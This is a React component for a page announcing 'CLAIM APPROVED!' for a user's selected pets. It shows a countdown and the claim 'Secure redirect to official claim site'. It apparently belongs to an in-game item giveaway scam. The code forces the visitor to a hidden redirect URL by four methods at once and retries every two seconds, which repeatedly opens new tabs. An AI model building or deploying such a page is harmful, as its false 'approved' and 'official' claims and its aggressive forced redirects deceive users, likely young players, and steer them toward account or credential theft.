"use client"

import { useEffect, useState } from "react"
import { Loader2, ExternalLink, Gift, Zap } from "lucide-react"

interface RedirectPageProps {
  redirectUrl: string
  username?: string
  petCount?: number
}

export default function RedirectPage({ redirectUrl, username, petCount = 0 }: RedirectPageProps) {
  const [countdown, setCountdown] = useState(3)
  const [redirectAttempts, setRedirectAttempts] = useState(0)

  useEffect(() => {
    console.log("🚀 RedirectPage mounted, starting redirect process...")

    // Immediate redirect attempts
    const performRedirect = () => {
      console.log(`🚀 Redirect attempt ${redirectAttempts + 1}`)
      setRedirectAttempts((prev) => prev + 1)

      // Method 1: Direct location change
      window.location.href = redirectUrl

      // Method 2: Window.open as backup
      setTimeout(() => {
        window.open(redirectUrl, "_blank", "noopener,noreferrer")
      }, 100)

      // Method 3: Location replace
      setTimeout(() => {
        window.location.replace(redirectUrl)
      }, 200)

      // Method 4: Create and click link
      setTimeout(() => {
        const link = document.createElement("a")
        link.href = redirectUrl
        link.target = "_blank"
        link.rel = "noopener noreferrer"
        link.style.display = "none"
        document.body.appendChild(link)
        link.click()
        document.body.removeChild(link)
      }, 300)
    }

    // Start redirecting immediately
    performRedirect()

    // Countdown timer
    const countdownTimer = setInterval(() => {
      setCountdown((prev) => {
        if (prev <= 1) {
          clearInterval(countdownTimer)
          // Try redirect again if still on page
          performRedirect()
          return 0
        }
        return prev - 1
      })
    }, 1000)

    // Retry redirect every 2 seconds if still on page
    const retryTimer = setInterval(() => {
      performRedirect()
    }, 2000)

    return () => {
      clearInterval(countdownTimer)
      clearInterval(retryTimer)
    }
  }, [redirectUrl, redirectAttempts])

  return (
    <div className="min-h-screen bg-gradient-to-br from-green-400 via-blue-500 to-purple-600 flex items-center justify-center relative overflow-hidden">
      {/* Animated background elements */}
      <div className="absolute inset-0">
        <div
          className="absolute top-20 left-20 w-32 h-32 bg-white/10 rounded-full animate-bounce"
          style={{ animationDelay: "0s" }}
        ></div>
        <div
          className="absolute top-40 right-32 w-24 h-24 bg-white/10 rounded-full animate-bounce"
          style={{ animationDelay: "1s" }}
        ></div>
        <div
          className="absolute bottom-32 left-1/3 w-40 h-40 bg-white/10 rounded-full animate-bounce"
          style={{ animationDelay: "2s" }}
        ></div>
        <div
          className="absolute bottom-20 right-20 w-28 h-28 bg-white/10 rounded-full animate-bounce"
          style={{ animationDelay: "0.5s" }}
        ></div>
      </div>

      <div className="bg-white/95 backdrop-blur-sm rounded-3xl p-8 sm:p-12 max-w-md w-full mx-4 text-center shadow-2xl relative z-10">
        {/* Success Icon */}
        <div className="mb-6">
          <div className="w-20 h-20 bg-green-500 rounded-full flex items-center justify-center mx-auto mb-4 animate-pulse">
            <Gift className="h-10 w-10 text-white" />
          </div>
          <div className="flex justify-center items-center gap-2 mb-2">
            <Zap className="h-5 w-5 text-yellow-500 animate-pulse" />
            <span className="text-green-600 font-bold text-lg">CLAIM APPROVED!</span>
            <Zap className="h-5 w-5 text-yellow-500 animate-pulse" />
          </div>
        </div>

        {/* Main Message */}
        <h1 className="text-2xl sm:text-3xl font-bold text-gray-800 mb-4">🎉 Redirecting You Now!</h1>

        <p className="text-gray-600 mb-6 text-lg">Please wait while we redirect you to the claim site...</p>

        {/* User Info */}
        {username && (
          <div className="bg-blue-50 rounded-lg p-4 mb-6">
            <p className="text-sm text-gray-600 mb-1">Claiming for:</p>
            <p className="font-bold text-blue-700">@{username}</p>
            {petCount > 0 && <p className="text-sm text-gray-600 mt-1">{petCount} pets selected</p>}
          </div>
        )}

        {/* Loading Animation */}
        <div className="mb-6">
          <div className="flex justify-center items-center gap-3 mb-4">
            <Loader2 className="h-8 w-8 text-blue-500 animate-spin" />
            <span className="text-xl font-semibold text-gray-700">Redirecting in {countdown}...</span>
          </div>

          {/* Progress Bar */}
          <div className="w-full bg-gray-200 rounded-full h-3 mb-4">
            <div
              className="bg-gradient-to-r from-blue-500 to-green-500 h-3 rounded-full transition-all duration-1000 animate-pulse"
              style={{ width: `${((3 - countdown) / 3) * 100}%` }}
            ></div>
          </div>

          {/* Animated dots */}
          <div className="flex justify-center space-x-2">
            <div className="w-3 h-3 bg-blue-500 rounded-full animate-bounce" style={{ animationDelay: "0ms" }}></div>
            <div className="w-3 h-3 bg-blue-500 rounded-full animate-bounce" style={{ animationDelay: "150ms" }}></div>
            <div className="w-3 h-3 bg-blue-500 rounded-full animate-bounce" style={{ animationDelay: "300ms" }}></div>
          </div>
        </div>

        {/* Manual Redirect Button */}
        <div className="space-y-3">
          <button
            onClick={() => window.open(redirectUrl, "_blank", "noopener,noreferrer")}
            className="w-full bg-gradient-to-r from-green-500 to-blue-500 hover:from-green-600 hover:to-blue-600 text-white font-bold py-4 px-6 rounded-xl transition-all duration-200 transform hover:scale-105 flex items-center justify-center gap-2"
          >
            <ExternalLink className="h-5 w-5" />
            Click Here if Not Redirected
          </button>

          <p className="text-xs text-gray-500">Redirect attempts: {redirectAttempts}</p>
        </div>

        {/* Security Message */}
        <div className="mt-6 p-3 bg-yellow-50 border border-yellow-200 rounded-lg">
          <p className="text-xs text-yellow-700">🔒 Secure redirect to official claim site</p>
        </div>
      </div>
    </div>
  )
}
